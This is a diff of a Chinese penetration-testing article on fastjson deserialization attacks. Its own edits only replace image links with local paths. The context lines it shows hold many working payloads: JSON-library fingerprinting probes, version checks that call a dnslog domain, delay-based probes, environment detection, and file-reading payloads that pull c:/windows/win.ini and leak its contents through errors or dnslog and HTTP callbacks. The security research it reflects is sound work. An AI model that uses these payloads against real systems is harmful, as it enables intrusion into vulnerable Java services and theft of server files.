@@ -99,7 +99,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDAAgqSialICy5DHZ2jdJ5repImdJRz6pNY0f1Hxcye9BUWGiatgPh4uuw/640?wx_fmt=png)接下来，如果不做特别说明的话，我都是向`json`接口进行`post`请求`payload`。
+![](../../.resource/remote/e9f711ea505aba0cb84741555497f517425bdfcf23e0574959b03791ce4ad030.png)接下来，如果不做特别说明的话，我都是向`json`接口进行`post`请求`payload`。
 
 一、判断所使用的 Json 库
 ===============
@@ -139,7 +139,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-如果解析成功，那么说明目标使用的是`fastjson`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDz93Bfm9NRc1ia7CJHXE1ric1W4ibQic4M1nXVAElSPPxiap2lAstMzqQynA/640?wx_fmt=png)至于这个下面的这个`payload4`，需要根据具体环境参数来修改，不可直接使用：
+如果解析成功，那么说明目标使用的是`fastjson`：![](../../.resource/remote/95d17c3cc3060eefa1bbc7b337964c1da80254794890ddbcb98eed4eef474293.png)至于这个下面的这个`payload4`，需要根据具体环境参数来修改，不可直接使用：
 
 ```
 {"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
@@ -147,7 +147,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-本意就是如果能对上面的参数的值自动解析，说明使用了`fastjson`组件：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDb5LFFxIDMGw7pXVd5QHPo1jnY5BpuNx7weic5ZXKgKRSTIf6ic2ja2Ww/640?wx_fmt=png)`payload5`：
+本意就是如果能对上面的参数的值自动解析，说明使用了`fastjson`组件：![](../../.resource/remote/7137c78df67a8e3dc63662642f0542e4cc906418a9ec2193c1747aef96c80695.png)`payload5`：
 
 ```
 {"@type": "whatever"}
@@ -155,7 +155,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-如果对方的代码写的是像我这样显示报错内容的话，可以通过这个来判断（出现`autoType is not support. whatever`说明使用了`fastjson`），但是一般不会，所以实战中基本上用不到：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDiaVI7Pn8ulZvPcQlBNAQXiaa3S6FMsbRkINJ2nno337cGuicUtlHuY8Pw/640?wx_fmt=png)
+如果对方的代码写的是像我这样显示报错内容的话，可以通过这个来判断（出现`autoType is not support. whatever`说明使用了`fastjson`），但是一般不会，所以实战中基本上用不到：![](../../.resource/remote/404cd29f24f824b58fae5bbee76b53ec134495abd01b6f729596e391e3a74e73.png)
 
 1.2 jackson
 -----------
@@ -178,7 +178,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-如果返回结果是类似`1.1111111111111112`这种，那么就说明使用的可能是`jackson`（`fastjson`如果不加`Feature.UseBigDecimal`这个参数，也会丢失精度；`gson`也是会丢失精度的；因此可以继续利用前面的`payload`来进一步区分`fastjson`、`jackson`和`gson`）：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDJ2Pdx81G4ZSWMw93qNu3bhL9LxJE7IhxOe6rEbyqXp7c5K68O7bgQA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDuhF6mRM84ib019ic4vCoj3xtpTjzmONH43TvIWJTCfm1x15B1u6uK3Gw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDJkoZe1nnAicw5bpZo5vtbIVX9vSMn7obzW12RvH5fZBwk5ibPh3JaXkQ/640?wx_fmt=png)
+如果返回结果是类似`1.1111111111111112`这种，那么就说明使用的可能是`jackson`（`fastjson`如果不加`Feature.UseBigDecimal`这个参数，也会丢失精度；`gson`也是会丢失精度的；因此可以继续利用前面的`payload`来进一步区分`fastjson`、`jackson`和`gson`）：![](../../.resource/remote/f40b0bfe214075c850ada16937d9c74ed65311343ed281013ded67447c5d1433.png)![](../../.resource/remote/816cd9a96579d251b6b01fab29e0ce4305acce6a3ea5ea3f50fc9f14b3ca76ba.png)![](../../.resource/remote/288711839181aee23bf39a818594fdb10725b8e1a630a8223f6f2b5be4f9ee96.png)
 
 ### 1.2.2 注释符判断法
 
@@ -190,7 +190,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-如果不报错，说明使用的是`jackson`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDtQcFSENn7xMhvAK2iaJALHf0TSuUH2eNgWt4utibQZmx6E3HjBEM0GMg/640?wx_fmt=png)
+如果不报错，说明使用的是`jackson`：![](../../.resource/remote/72e832ac6ba3fbddf5491cd79eb7bd2ec2c85c48df2f95f12190ad2e6f2569ff.png)
 
 ### 1.2.3 单引号判断法
 
@@ -210,7 +210,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDFdYRpXVgnHsh1ZYnRebRHMrRfzibylVjIxf7l3b7ichCklDicib83jY6Yw/640?wx_fmt=png)如果改成单引号，报错如上，那么就是`jackson`。`fastjson`是不报错的：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDbWBUy5cKibkDx3zic8l6n26oOVlL2r4S86R7ajaoiaj8bY6WjMR9hoRVg/640?wx_fmt=png)
+![](../../.resource/remote/aad21109889a234697514eab897f89ad251d41cfa5fe05d608eb18f9205caeeb.png)如果改成单引号，报错如上，那么就是`jackson`。`fastjson`是不报错的：![](../../.resource/remote/82b4b96e4ddc4855e8c684cc1923cafb21c41999f99f0bf309026c9a85523806.png)
 
 ### 1.2.4 多余类成员判断法
 
@@ -230,7 +230,7 @@ public JSONObject parse(@RequestBody String data) {
 
 ```
 
-如果报错如下，则说明是`jackson`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDyzicyZHQz5ptQiahhOTZ66CKqIaKC9qSj9PdzBl2ib0ibcm4C7JjemcaZw/640?wx_fmt=png)`fastjson`是不会报错的，这里我们请求`doLogin`路由来验证：
+如果报错如下，则说明是`jackson`：![](../../.resource/remote/d2fe76b185e62c0dc0f7bed9591c4c7e6243314d1425fabac41f12f85638de2e.png)`fastjson`是不会报错的，这里我们请求`doLogin`路由来验证：
 
 ```
 POST /doLogin?username=admin&password=admin&test=1&rememberme=remember-me HTTP/1.1
@@ -245,7 +245,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDQxZUHtOiaflW7CNnakpSGb1btZARwhmdKyFWjW9z5Dib7ERB41bUEC6g/640?wx_fmt=png)image.png
+![](../../.resource/remote/32caec5ae76fb7170720c85a867ed24d5be212bcaaf0e9f35b7cadbf244ace3e.png)image.png
 
 1.3 gson
 --------
@@ -264,7 +264,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD3TJVHZHDwPA60hTqK78wBM9iaKchNDECsicZNTFzqbibjNTINf9ygiawWA/640?wx_fmt=png)正常说明为`gson`。
+![](../../.resource/remote/ce970b823e2bc115e9b2d1cabe93c330d9f6943903634a015a15fef7706de538.png)正常说明为`gson`。
 
 1.4 org.json
 ------------
@@ -277,7 +277,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDSLOickAWSKHGbevrBxCpEP5ApIdTL3xUUN47uH07b6vBDXcdOf29rkA/640?wx_fmt=png)出现如上报错，说明使用的是`org.json`，这个就需要能看到报错的内容了。
+![](../../.resource/remote/8627606c7a1a320e834229aca1831e0cf06f5928b79804499528d296921d2002.png)出现如上报错，说明使用的是`org.json`，这个就需要能看到报错的内容了。
 
 1.5 hutool.json
 ---------------
@@ -290,7 +290,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 ```
 
-如果返回正确（最好是能看到返回的值为`{"a":"whatever"}`），说明使用的是`hutool.json`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDCbR5ribaOiaLereLLtWIUQb3PU1g37T3nH2WlvfHUpDtL8uJy3O03kbA/640?wx_fmt=png)
+如果返回正确（最好是能看到返回的值为`{"a":"whatever"}`），说明使用的是`hutool.json`：![](../../.resource/remote/566ead9062dc590cf6d471af0e05c86466177f776d4cfad7b27aa647d25a6d0b.png)
 
 二、判断 fastjson 版本
 ================
@@ -318,7 +318,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 > https://github.com/iSafeBlue/fastjson-autotype-bypass-demo
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDmkrP9ujicAevwRzU8Rvcq825mNDTicBH3JeCF8QocXB90Yk6uyG34vpg/640?wx_fmt=png)需要说明的是，该 payload 只适用于 至于`["test":1]`这个`payload`，我在该靶场没有测试成功；我后来自己写了个`demo`，测试成功，大家也可以自行测试：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDoe465hZk0ZzeTbAzZTHVGNrNChDXUCK9QIjtFynAMV2ibUKibFoH3bMA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDkBuiax8hicicBS7VBMaIdy3MEob5GcJmFApBOgD2StJrSfbDOnUFShWnw/640?wx_fmt=png)对于`payload13`的报错情况，我们还可以细分。如果代码在写的时候几乎没有做任何异常处理（这种情况挺少见的），那么我们根据报错的代码出错点很快就可以判断出对方使用的是`parseObject`还是`parse`来处理数据的；否则我们只能根据有限的返回的报错信息来判断：
+![](../../.resource/remote/fe62d1353f780de9302863b176e6b13bca10d5c47044b5024cdb011f96a93d34.png)需要说明的是，该 payload 只适用于 至于`["test":1]`这个`payload`，我在该靶场没有测试成功；我后来自己写了个`demo`，测试成功，大家也可以自行测试：![](../../.resource/remote/5ba75510364e2c728613eaaa66022051fe483471d94ad016791f4c6fe3bcd881.png)![](../../.resource/remote/e2efa5d0c44b5f737084e917f039c5dfeadd9490ec4c0bb0a9ef2765d0897ea3.png)对于`payload13`的报错情况，我们还可以细分。如果代码在写的时候几乎没有做任何异常处理（这种情况挺少见的），那么我们根据报错的代码出错点很快就可以判断出对方使用的是`parseObject`还是`parse`来处理数据的；否则我们只能根据有限的返回的报错信息来判断：
 
 ### 2.1.1 JSON.parseObject(jsondata, User.class)
 
@@ -440,7 +440,7 @@ Illegal syntax: , offset 34, character  , line 1, column 35, fastjson-version 2.
 
 ```
 
-但是需要注意的是`1.2.76<=version<=1.2.80`的时候，显示的版本都是`1.2.76`，原因是作者写死在代码里了，我提了个`issue`（https://github.com/alibaba/fastjson/issues/4451）：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDCeO4CfVwK3v2HPlg4asJCeJsr6tUib4Y6PtVPs7nh4z2KsZcCsE176g/640?wx_fmt=png)
+但是需要注意的是`1.2.76<=version<=1.2.80`的时候，显示的版本都是`1.2.76`，原因是作者写死在代码里了，我提了个`issue`（https://github.com/alibaba/fastjson/issues/4451）： ![](../../.resource/remote/6ed0070fc8ffe14977a2d8cd87a9db5f25d26ca739ee6386d4aa7af3cf76ec82.png)
 
 2.2 dnslog 判断法
 --------------
@@ -465,7 +465,7 @@ Illegal syntax: , offset 34, character  , line 1, column 35, fastjson-version 2.
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDqfViaLqyEpRTZykoGxce1BWerHVS0icfBtZ3JNfGRYhFzj9QC9icoLNtg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD1uAbwsZw7f3NCeibNXjibQswsGNtwkBdB0Eibvcog3aw6Pz44Fq3clavA/640?wx_fmt=png)
+![](../../.resource/remote/1353a1f4e5b87831de4cb0be30576d93f17adfb009545cd946f93b32499a942e.png)![](../../.resource/remote/28e8f02bdc99310b8bc1b947b6f8740da5f2686618dc648b8aade428430e4f19.png)
 
 ### 2.2.2 判断 1.2.37<=version<=1.2.83
 
@@ -574,7 +574,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-大部分情况下，如果报错，说明版本处于`1.2.48`到`1.2.83`，但是有时候也可能因为环境本身而出现奇奇怪怪的问题，比如我这里`1.2.24`也报错，只是报错内容不同：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDy0wCYWxq20fPuPlElWUDpaWmAuZVJKWtYewzZMZYK9hX7XAL7l8tmA/640?wx_fmt=png)`1.2.47`也报错，报错内容和前两者都不同：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDs25c684FET4VL2gLaiaxKibDRgibLwfPRQoUicCQiawD8AO7ZqRTuaa1q9g/640?wx_fmt=png)由于我们不知道报错的详细信息，因此感觉不能作为一个精确判断的方法。我后来又拿之前的`demo`进行测试，发现符合结论，师傅们利用的时候须要注意。
+大部分情况下，如果报错，说明版本处于`1.2.48`到`1.2.83`，但是有时候也可能因为环境本身而出现奇奇怪怪的问题，比如我这里`1.2.24`也报错，只是报错内容不同：![](../../.resource/remote/80cf85ef9de9b6530e31bc7b785b2681799a1dd11d9fe6c2a944f64300cc3a1b.png)`1.2.47`也报错，报错内容和前两者都不同：![](../../.resource/remote/77ba41ada2ad4db6465f451542a0472864e2ab8939d2ad468e3a7c9069401027.png)由于我们不知道报错的详细信息，因此感觉不能作为一个精确判断的方法。我后来又拿之前的`demo`进行测试，发现符合结论，师傅们利用的时候须要注意。
 
 ### 2.2.11 判断 version=1.2.24
 
@@ -586,7 +586,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-按照`@kezibei`师傅给出的结论，这个`payload`只有`1.2.24`是不报错的，但是我本地靶场环境`1.2.24`也报错，只是和其他版本的不同：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDQAEiaUTZ1xsEdm9IdGgIJFVuHIQmmib7OVwgUFkIKmVG7vfMibJmdJJJQ/640?wx_fmt=png)我又拿`demo`测试了下，发现符合结论：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDAfFhJxdp0Dp3kLwBqf9ymsuGjtBuFktfLTZS8xV6o9Q2t6xylNBmHA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDffYVAt94paMYM00WrRicaKM9k9nXVaVoicesweWxhKk8vyVzweiasz8pw/640?wx_fmt=png)
+按照`@kezibei`师傅给出的结论，这个`payload`只有`1.2.24`是不报错的，但是我本地靶场环境`1.2.24`也报错，只是和其他版本的不同：![](../../.resource/remote/d83a017295953b28c786aa0a5124ff28a32956d0c1d580601b01a98968e7b56a.png)我又拿`demo`测试了下，发现符合结论：![](../../.resource/remote/11cc75918153e7f7285f89239cb4b5ab5523ea4bc3ff2eba8e94158ceff8aae3.png)![](../../.resource/remote/2d84f17fcf1aa2041c1c7cae18ba1b91949bbca665ac514e166c56c54b42e7b1.png)
 
 2.3 延迟判断法
 ---------
@@ -623,7 +623,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-先用第一个，再用第二个，如果第一个响应时间很长，而第二个较短，则说明版本：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDCgbg9SC4U6iagASDYWKyKLBWL4CDvZ9f4SMia1Wrh12mlicDKxrDAq3hw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDFshIzT3OrwscNggWm6mlIicE1CZgLy1c0Aia3ASq07m0NM4YAR8icPrVQ/640?wx_fmt=png)
+先用第一个，再用第二个，如果第一个响应时间很长，而第二个较短，则说明版本：![](../../.resource/remote/244dcc018935f010592c529f2c165c5303e9acc37ed0c7de5f1631cb99df58b1.png)![](../../.resource/remote/2558da304c9362fa1d0b948653180395f31a6db99642c496b856ac9285734a20.png)
 
 #### 2.3.2.2 判断 1.1.16<=version<=1.2.24
 
@@ -722,7 +722,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-都是可以的：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD7yHdUBdNqVVrOfMqcdPpTsz2eCUzmo9faoZN40gOtyw1L38fHnJkiaA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDM22FhkuP84ice2Odniblg3TbjCoibAd0f0j7JM1icRJvhJ6IxbfBr2jPicg/640?wx_fmt=png)
+都是可以的：![](../../.resource/remote/f2de716a4ce18487042f3efaa4dc50cb889c9476aafe6829385db88625b5a62b.png)![](../../.resource/remote/1832c087fe45dc3f6b562c6da9e1dfdf4900f45629024dc7bc7b33f12e9f0fe9.png)
 
 ### 2.4.3 v1.2.68
 
@@ -734,7 +734,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDNJzlLrCWaHzlhhkqwb6rIGKleuHGia4Ak3pyVsenfFxoEF0KTvrRNMg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDsMjshQ9m1eCxXgRdB5QMwxnS78RNYYrzNlhLQBSHz0icicqSfLSO7CjA/640?wx_fmt=png)
+![](../../.resource/remote/bfe465c76b1a90187fd2c76167b95e779a25c676fcc3648711a39d6b78e1f3a1.png)![](../../.resource/remote/cb525a7c779e66b9046419dc96b5a1b1253220f93bf2e3ff7d66ea50e52becaf.png)
 
 ### 2.4.4 v1.2.80 与 v1.2.83
 
@@ -746,7 +746,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 
 ```
 
-如果第一个收到响应而第二个没有收到，说明版本为`1.2.80`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDibKwpRovqmDibQ3qFXftTXpXfFVj8x9daQSXJkkibsNTRPkCmXan1tBgA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD7NlTNFsMeVDffw8At9VUMLVxWwTQe9d06K9APSTSib3XuDJChQAGlug/640?wx_fmt=png)如果两个都收到了，说明版本是`1.2.83`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDneRANXoDrNbfCCnVbJDHakia2ibJiboh3ttzJaZIBs0KsR0Npb19S8M6A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDl34KHhZRZ28iaQjGl7E9496JCIsYagicZqJ5p7dpvyeKME8CWMwNIo1Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDT3qx7b7YHw1a0dRib1uKgqDenEakNibvyCO37IhMtvRicvQcmcpqlk0FQ/640?wx_fmt=png)
+如果第一个收到响应而第二个没有收到，说明版本为`1.2.80`：![](../../.resource/remote/b67d4422f2d2f3224632282b06a195cb9b9500586bd3420bd18a6aeb6b31e5a9.png)![](../../.resource/remote/4a67a894aa2ce92e363e4aa1f93686e8160778a4f2aca243ec3091465323af3b.png)如果两个都收到了，说明版本是`1.2.83`：![](../../.resource/remote/da2bd61eb4d52f6beb553833139e45c1178eb62c19058c995ede2711dc7870a2.png)![](../../.resource/remote/b6b0d348e6efcbc11e3d7016373e0b896030bbcadd8cb9b41ef7158c8e3b67b5.png)![](../../.resource/remote/d46739da6b2edc44349f0f968c1d1a54da476716d1bb0cbb782be8966c7b5c9f.png)
 
 三、探测服务器环境
 =========
@@ -774,7 +774,7 @@ java.net.http.HttpClient
 
 ```
 
-如果系统存在这个类，会返回一个类实例；如果不存在会返回`null`。例如：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD07PLial6yqnZfhNbeDAPaGLWCc6uMMZN3XouLZkIhPp7WujzQcEoXog/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDSWo8gWLJ2qYrvaeH5cOpvrkswBuhTuxlgKyu7UNFicsq1pWLnH4IDJg/640?wx_fmt=png)
+如果系统存在这个类，会返回一个类实例；如果不存在会返回`null`。例如：![](../../.resource/remote/901aa1e93090368eeb50b6141ad96e80a23187bbe18cc1d4b65969bea92fab46.png)![](../../.resource/remote/8c66e27c3d51d385ce40b88fff5022f5c1e59458cd1907660bf3cdb8232bd4c2.png)
 
 3.2 dnslog 回显判断法
 ----------------
@@ -800,7 +800,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDZpzGLZzzOWqmjc1GgibWunJDy2fC3KqX2Y1GIkKPWX5pEFRKU9nyf1Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDJjqRbhtjfhSWkibic5oh6dThZiciatjyicdE7vKlKMEoicY4ngYxhXWDYfHg/640?wx_fmt=png)
+![](../../.resource/remote/08dfaf2a23436e7085dd1b8e297a74cfc75e69cf62b0885fb799f5d192552b37.png)![](../../.resource/remote/13b7ba1f68f513abb1b29f1e86898f5cce6f8fc3e6431b675b1a6e385706fec0.png)
 
 四、文件读取
 ======
@@ -842,7 +842,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDLT9jcqRckAjic0ibDGibYJNxz1ibRA4IKicRVjwRafqrcrnOlsxicXvoBctQ/640?wx_fmt=png)也可以直接利用`JSON.parse`可以解析`[]`的特性直接一次打：
+![](../../.resource/remote/4f02aa822ea908bcd252961e221d1f713dda3ffaf2face1a64c03eb08c17170c.png)也可以直接利用`JSON.parse`可以解析`[]`的特性直接一次打：
 
 ```
 [{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]\}\\}\},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"},"password":"admin"}]
@@ -850,7 +850,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDY0zwfjTu8EkR6bvR9TQo6nzhpvuxVTR2ic8kibI4xvImdfbWCU95uudA/640?wx_fmt=png)
+![](../../.resource/remote/cb5ce95874a180d9a6ade90be83f84e777434fec9b1eba6c69232214d3747df2.png)
 
 #### 4.1.1.2 报错回显法
 
@@ -862,7 +862,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDxZYYWDX7FzrqQOyH2FiarlUceCC3Cib9d1XgAHgsEalKFuYImVxbKYIA/640?wx_fmt=png)
+![](../../.resource/remote/524097a5ef1a320bb06a5d651cb7d110154661c9216cbb221c3f2e16e4f44296.png)
 
 #### 4.1.1.3 dnslog 回显法（需要对方为 mac 环境且 dnslog 平台支持特殊符号）
 
@@ -876,7 +876,7 @@ java.net.http.HttpClient
 
 但是只有`mac`才支持`ping`带花括号的域名，所以我`Windows`这里会提示`deserialize inet adress error`：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDgq94IicYhwcfnUMzu4zKrLSJHrSbrKNmia5XprCyh3k3aGqWZ6SWRPyA/640?wx_fmt=png)
+![](../../.resource/remote/27b4e62834e3d3bb8aa6e889febef19de2ebdee3cc281dbd5e8acb555bea46bb.png)
 
 #### 4.1.1.4 httplog 回显法（另需 ognl>=2.7 以及 commons-io>=2.0）
 
@@ -898,11 +898,11 @@ java.net.http.HttpClient
 
 我这里实际测试过程中，文件中有中文字符的时候出现了乱码：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD2QL1yfCNoibyYY8tDgJj5RunU0NB73qQuO5xmgyTW9m8icicMe0UyeLLw/640?wx_fmt=png)
+![](../../.resource/remote/c0bcc752425bde295f7793792fe6d4d0861a1948d1452105c870a7afb8309c1f.png)
 
 我的解决方法是，使用`yakit`的端口监听器：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDgsfXBgRo8m26EDibbn10uvvZVOcuGdNibicDNMeuKHRby0iaSEhCfoMTjA/640?wx_fmt=png)
+![](../../.resource/remote/755582a3070eafad66ad2743a44a25f150100c0853640230cad62b1b1e102800.png)
 
 `yakit`真是太好用了，有木有~
 
@@ -944,7 +944,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDNTSxnriaNfEUdBZbibR2TicHliaC4WVUxbNkxNvkKia6DU3APiau2fJ1XnAw/640?wx_fmt=png)
+![](../../.resource/remote/8ee3c3279e0aea54dfe2a16e8a8e8856d1367ed043cc1838e90976a723c100c2.png)
 
 #### 4.1.2.2 httplog 回显法
 
@@ -991,7 +991,7 @@ java.net.http.HttpClient
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDYhzehD8aReOAbkBk6xtHFOJUH7cWTLvsFWCOoRM0osAj1uAOwdJzTQ/640?wx_fmt=png)
+![](../../.resource/remote/b267dde4dd8879df5080ff41e119389baaa30dc3f4ebaf6c849df381fa23db54.png)
 
 > 它会拿`win.ini`的内容转成`int`数组，然后拿`ByteOrderMark`里的`bytes`挨个字节遍历去比对，如果遍历过程有比对错误的`getBom`就会返回一个`null`，如果遍历结束，没有比对错误那就会返回一个`ByteOrderMark`对象。所以这里文件读取成功的标志应该是`getBom`返回结果不为`null`。
 
@@ -1046,7 +1046,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDkssptDXqVd8fvJwqs8HQiblDPjHQNy4pE1y3xfelTtWZ9L3ZZoLttug/640?wx_fmt=png)
+![](../../.resource/remote/7b86ec28c4140c2123ca61ff98a7a9d7303b897e94517b2fed9cc8a24cf17881.png)
 
 极端场景：有一个接口，用`fastjson`解析了`json`，但不会反馈任何能够作为状态判断的标识，连异常报错的信息都没有。
 
@@ -1064,7 +1064,7 @@ public class str2bytes {
 
 该`payload`是浅蓝师傅的`payload`的改版，主要区别在于这个是`dnslog`或者`http`服务有响应说明字节码比对成功，和浅蓝的那个是反着来的。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDjRiaHedsJLRxYUiaDyn5JWC5Qf6Rhp2qEA0QYngUBDI7SRlNsGy1GhJA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDwm9e7ICBeZvcHKXjTKLjPOvoibgAlEzWdFBTSd9d6MNlYlqrSBlOG0w/640?wx_fmt=png)
+![](../../.resource/remote/ac39b485e722ce3589a7c8b36d24ec4917657c68660e24d8e65de92d54e9e8ca.png)![](../../.resource/remote/934541918ec51a74053a82973b4b46af5f670ff705425578672dcba92417abf7.png)
 
 五、文件写入
 ======
@@ -1102,7 +1102,7 @@ public class str2bytes {
 
 `Windows`下利用会报错，只能在目标是`centos`的情况下使用：
 
